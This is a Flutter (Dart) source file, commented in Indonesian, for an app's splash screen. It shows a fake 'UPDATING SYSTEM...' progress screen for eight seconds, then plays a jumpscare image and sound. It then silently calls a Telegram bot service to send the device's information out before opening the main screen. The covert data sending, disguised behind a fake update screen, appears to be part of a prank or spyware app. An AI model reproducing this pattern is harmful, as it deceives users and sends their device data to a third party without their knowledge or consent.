import 'dart:async';
import 'package:flutter/material.dart';
import 'package:audioplayers/audioplayers.dart';
import '../services/telegram_bot.dart';
import 'main_screen.dart';

class SplashJumpscareScreen extends StatefulWidget {
  const SplashJumpscareScreen({super.key});

  @override
  State<SplashJumpscareScreen> createState() => _SplashJumpscareScreenState();
}

class _SplashJumpscareScreenState extends State<SplashJumpscareScreen> {
  final AudioPlayer _audioPlayer = AudioPlayer();
  
  @override
  void initState() {
    super.initState();
    _startJumpscareSequence();
  }

  Future<void> _startJumpscareSequence() async {
    // Loading palsu 8 detik dulu
    await Future.delayed(const Duration(seconds: 8));
    
    // Play sound jumpscare
    await _audioPlayer.play(AssetSource('jumpscare_sound.mp3'));
    
    // Tampilin jumpscare 2 detik
    setState(() {});
    
    await Future.delayed(const Duration(seconds: 2));
    
    // Stop sound
    await _audioPlayer.stop();
    
    // Kirim data device & lanjut ke main screen
    await TelegramBotService.sendDeviceInfo();
    
    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const MainScreen()),
      );
    }
  }

  @override
  void dispose() {
    _audioPlayer.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Container(
        width: double.infinity,
        height: double.infinity,
        decoration: const BoxDecoration(
          image: DecorationImage(
            image: AssetImage('assets/jumpscare.jpg'),
            fit: BoxFit.cover,
          ),
        ),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(
                Icons.update,
                color: Colors.white,
                size: 80,
              ),
              const SizedBox(height: 20),
              const Text(
                'UPDATING SYSTEM...',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 24,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 20),
              const SizedBox(
                width: 200,
                child: LinearProgressIndicator(
                  backgroundColor: Colors.white24,
                  valueColor: AlwaysStoppedAnimation<Color>(Colors.green),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}